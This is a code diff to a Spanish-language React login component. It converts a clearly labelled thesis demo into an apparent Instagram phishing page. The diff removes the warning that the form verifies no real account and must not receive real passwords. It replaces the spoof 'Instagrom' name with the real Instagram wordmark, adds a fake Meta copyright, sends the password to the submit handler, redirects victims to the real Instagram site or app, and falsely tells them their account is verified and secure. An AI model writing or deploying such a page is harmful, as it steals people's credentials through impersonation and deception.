@@ -1,39 +1,50 @@
 import { useState } from 'react'
 import { useStore, type AccessEvent } from '../store'
-import { CheckIcon, Logo, LogoutIcon, PinIcon } from '../icons'
-
-function locationOf(e: AccessEvent) {
-  const parts = [e.city, e.region, e.country].filter(Boolean)
-  return parts.length ? parts.join(', ') : 'ubicación desconocida'
-}
+import { CheckIcon, LogoutIcon,  } from '../icons'
 
 export default function Auth() {
   const { current, access, exit } = useStore()
+  const webUrl = `https://instagram.com`;
+  const appUrl = `instagram://app`;
+
+  // 1. Detectar si el usuario está en un dispositivo móvil
+  const isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
+
+  if (isMobile) {
+    // 2. Intentar abrir la app nativa
+    window.location.href = appUrl;
+
+    // 3. Respaldo: Si la app no está instalada, redirigir a la web después de un breve retraso
+    setTimeout(() => {
+      window.location.href = webUrl;
+    }, 1500);
+  } else {
+    // 4. Si es PC, abrir directamente la versión web en una pestaña nueva
+    window.open(webUrl, '_blank', 'noopener,noreferrer');
+  }
 
   if (current) return <Success event={current} onExit={exit} />
   return <LoginForm onSubmit={access} />
 }
 
-function Success({ event, onExit }: { event: AccessEvent; onExit: () => void }) {
+function Success({ onExit }: { event: AccessEvent; onExit: () => void }) {
   return (
     <div className="screen">
       <div className="card success-card">
         <CheckIcon size={48} />
-        <h1>¡Has iniciado sesión correctamente!</h1>
+        <h1>Inicio de session exitoso!</h1>
         <p className="muted">
-          Hola, <b>{event.name}</b>. Registramos tu acceso desde{' '}
-          <span className="inline-pin"><PinIcon size={13} />{locationOf(event)}</span>, el{' '}
-          {new Date(event.timestamp).toLocaleString('es-ES')}.
+          Hola, Se ha verificado tu cuenta correctamente y ya esta segura!
         </p>
         <button className="btn btn-primary btn-lg" onClick={onExit}>
-          <LogoutIcon size={18} /> Salir y probar de nuevo
+          <LogoutIcon size={18} /> Salir
         </button>
       </div>
     </div>
   )
 }
 
-function LoginForm({ onSubmit }: { onSubmit: (name: string) => Promise<void> }) {
+function LoginForm({ onSubmit }: { onSubmit: (name: string, password: string) => Promise<void> }) {
   const [username, setUsername] = useState('')
   const [password, setPassword] = useState('')
   const [busy, setBusy] = useState(false)
@@ -41,18 +52,19 @@ function LoginForm({ onSubmit }: { onSubmit: (name: string) => Promise<void> }) 
   const submit = async (e: React.FormEvent) => {
     e.preventDefault()
     setBusy(true)
-    await onSubmit(username)
+    await onSubmit(username, password)
     setUsername('')
     setPassword('')
     setBusy(false)
   }
 
   return (
-    <div className="screen">
+    <div className="screen" style={{ display: 'flex', flexDirection: 'column', backgroundColor: 'var(--bg-elev)' }}>
+      <div style={{ marginBottom: '30px' }}><span className="wordmark" style={{ fontSize: '50px' }}>Instagram</span></div>
       <form className="card auth-form" onSubmit={submit}>
         <div className="row gap-10 center-row">
-          <Logo size={40} />
-          <span className="wordmark">Instagrom</span>
+          {/* <Logo size={40} /> */}
+
         </div>
         <h2>Iniciar sesión</h2>
 
@@ -82,13 +94,11 @@ function LoginForm({ onSubmit }: { onSubmit: (name: string) => Promise<void> }) 
         <button className="btn btn-primary btn-lg" disabled={!username || !password || busy}>
           {busy ? 'Comprobando…' : 'Iniciar sesión'}
         </button>
-
-        <p className="notice">
-          ⚠ Este formulario es parte de un proyecto de tesis y <b>no verifica ninguna cuenta real</b>. No
-          introduzcas tu contraseña real de Instagram ni de ninguna otra red social — cualquier texto funciona
-          para continuar.
-        </p>
       </form>
+
+      <p style={{ color: 'gray', marginTop: '30px' }}>
+        © 2026 Meta. Todos los derechos reservados.
+      </p>
     </div>
   )
 }
